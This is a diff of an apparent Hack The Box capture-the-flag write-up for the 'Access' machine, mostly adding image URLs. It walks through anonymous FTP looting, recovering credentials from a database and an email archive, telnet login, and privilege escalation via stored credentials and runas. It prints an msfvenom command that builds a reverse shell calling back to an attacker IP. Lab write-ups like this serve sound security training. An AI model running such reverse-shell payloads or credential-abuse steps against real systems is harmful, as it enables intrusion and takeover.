@@ -1,18 +1,18 @@
 # Access [htb](https://app.hackthebox.com/machines/Access)
-![Access-01]()
+![Access-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/acess-01.png)
 
 
 ## Recon
 
 Before we start enumeration, let's add the target to our `/etc/hosts` file:
-![hosts-02]()
+![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/hosts-02.png)
 
 
 Running nmap:
 
 `nmap -sC -sV -p- -A access.htb -oN nmap.result`
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/nmap-res-03.png)
 
 
 We have the following:
@@ -32,7 +32,7 @@ at the end if we get stuck.
 
 Let's login anonymously with `anonymous : anonymous`: 
 
-![anon-ftp-04]()
+![anon-ftp-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/anon-ftp-04.png)
 
 
 We have two folders: 
@@ -42,17 +42,17 @@ We have two folders:
 
 Lets cd into `Backups` and see what we can find: 
 
-![ftp-backups-05]()
+![ftp-backups-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/ftp-backups-05.png)
 
 
 Looks like we have an `.mdb` database here. Lets switch to binary mode and get this to our kali. 
 
-![get-db-06]()
+![get-db-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/get-db-06.png)
 
 
 We can open this type of database [online](https://www.mdbopener.com/): 
 
-![open-db-07]()
+![open-db-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/open-db-07.png)
 
 
 we get a list of all the tables in the database, and we can view them online. Iv'e found a couple
@@ -60,7 +60,7 @@ of interesting tabels. Primarly:
 
 + auth_user - This is the user table with clear-text credentials. 
 
-![auth-user-08]()
+![auth-user-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/auth-user-08.png)
 
 + action_log - Stores action performed by the admin when setting up the database. 
 + USERINFO   - Inforamtion about users. 
@@ -71,16 +71,16 @@ The `auth-user` is of most interest to us, we should try to use these credential
 server. But before we do that, there was another folder on the FTP, `Engineer`, 
 and we have a user named engineer in the db. Lets see what we can find. 
 
-![engineer-ftp-09]()
+![engineer-ftp-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/engineer-ftp-09.png)
 
 Looks important. Lets put this on our Kali: 
 
-![get-acl-10]()
+![get-acl-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/get-acl-10.png)
 
 
 If we examine the file with `file access_control.zip` (i renamed it): 
 
-![file-acl-11]()
+![file-acl-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/file-acl-11.png)
 
 
 We can see it's an AES encrypted ZIP archive. You can try to use `zip2john`, then crack it with 
@@ -91,7 +91,7 @@ Use `7za` to decompress the arachive:
 `7za e access_control.zip`
 
 
-![extract-12]()
+![extract-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/extract-12.png)
 
 
 This gives us a `.pst` file (personal storage table), which is a file format Microsoft programs 
@@ -106,12 +106,12 @@ We can open `.pst` files on Kali using `readpst`:
 
 Then read the file with `readpst acl.pst` (renamed the file). 
 
-![readpst-13]()
+![readpst-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/readpst-13.png)
 
 
 This outputs an `.mbox` file we can read on Unix with `less acl.mbox`:
 
-![mail-14]()
+![mail-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/mail-14.png)
 
 
 We found another user account, this time for a uyser named "security". This user didnt show 
@@ -123,7 +123,7 @@ up in the `auth-user` table from before. Lets take a look at the web-sever.
 
 If we open our browser and navigate towards `http://access.htb/` we get the following page:
 
-![site-15]()
+![site-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/site-15.png)
 
 Not much to do here, Lets try directory busting with: 
 
@@ -138,7 +138,7 @@ Nothing comes up. The site is empty, lets try the telnet.
 If we connect to the server with `telnet access.htb`, and wait just a sec... we will be prompted
 for credentials: 
 
-![shell-16]()
+![shell-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/shell-16.png)
 
 Use the credetials we got from the email `security : `4Cc3ssC0ntr0ller`.  
 Lets move to priv esc. 
@@ -149,17 +149,17 @@ Lets move to priv esc.
 
 If we list out our user privileges: 
 
-![privs-17]()
+![privs-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/privs-17.png)
 
 
 Nothing interesting comes out. If we list out `systeminfo` : 
 
-![sysinfo-18]()
+![sysinfo-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/sysinfo-18png.png)
 
 We can see wer'e running a 2008 server V6.1.7600. We can check exploits but there is a faster way.
 Lets search for stored credentials with `cmdkey /list`
 
-![creds-19]()
+![creds-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/creds-19.png)
 
 
 We can now use `runas` to take the admins passwords and run a reverse shell payload.
@@ -168,7 +168,7 @@ We can now use `runas` to take the admins passwords and run a reverse shell payl
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.68 LPORT=9009 -f exe > rshell.exe`
 
-![venom-20]()
+![venom-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/venom-20.png)
 
 
 + Start a python server with:
@@ -193,4 +193,4 @@ We can now use `runas` to take the admins passwords and run a reverse shell payl
 
 + Get a shell:
 
-![root-20]()
+![root-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/root-20.png)
